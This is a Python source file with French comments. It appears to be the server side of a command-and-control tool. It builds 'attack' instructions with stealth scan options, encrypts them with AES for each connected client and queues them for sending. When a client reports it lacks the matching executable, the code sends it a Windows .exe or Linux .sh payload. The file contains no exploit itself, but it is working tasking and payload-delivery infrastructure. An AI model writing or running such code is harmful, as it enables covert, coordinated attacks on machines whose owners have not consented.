import json
import argparse
import os
import mysql.connector
import json
import socket
import select
import threading
import rsa
import base64

from env import *
from database import *
from network import *
from functions import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from queue import Queue, Empty


def format_attack_data(type, id, data):

    json_data = json.loads('{"id":"'+str(id)+'","attack":"'+type+'","arg1":"stealth,t5","arg2":"nono","arg3":""}')


    json_data.update(data)

    print("json_data = " + str(json_data))

    return json_data



def execute_attack(client, attack):
    print("sending attack to " + str(client['addr']))
    print(client)

     # Récupération des données de l'attaque
    attack_data = json.loads(attack[5])
    attack_type = attack[2]
    attack_id = attack[0]

    data_to_send = format_attack_data(attack_type, attack_id, attack_data)

    # Envoi de l'attaque à l'ordinateur
    cipher_enc = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
    cipher_text = cipher_enc.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))

    client['emission_queue'].put(cipher_text)
    print("Instruction envoyée")

    # reception du message retourner par le client 
    try :
        cipher_dec = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
        encrypted_data_received = client['reception_queue'].get(timeout=10)
        pt = unpad(cipher_dec.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')

        if pt == "YES":
            # le client à l'exécutable
            print("Le client à déja l'exécutable")
        else:
            # envoyer l'exécutable 
            print("Le client n'a pas l'exécutable")
            attack_type = attack[2]
            #Récupérer os du client 
            if client['os'] == "windows":
                executable_path = 'actions/windows/' + attack_type + '.exe'
            else:
                executable_path = 'actions/linux/' + attack_type + '.sh'

            if os.path.isfile(executable_path):
                with open(executable_path, 'rb') as f:
                    executable_data = f.read()
                    
                    cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
                    cipher_text = cipher.encrypt(pad(executable_data, AES.block_size))
                    
                    client['emission_queue'].put(cipher_text)

                    print("L'exécutable a été envoyé")
            else:
                print("L'exécutable n'a pas été trouvé sur le serveur")
    except Empty:
        print("Le client n'a pas répondu")
        pass

    
    # Recevoir le status final de l'envoi de l'exécutable
    # encrypted_final_status = client['reception_queue'].get()
    # final_status = unpad(cipher.decrypt(encrypted_final_status), AES.block_size).decode('utf-8')
    # print(f"Statu final de l'attaque sur le client {client['addr']}: {final_status}")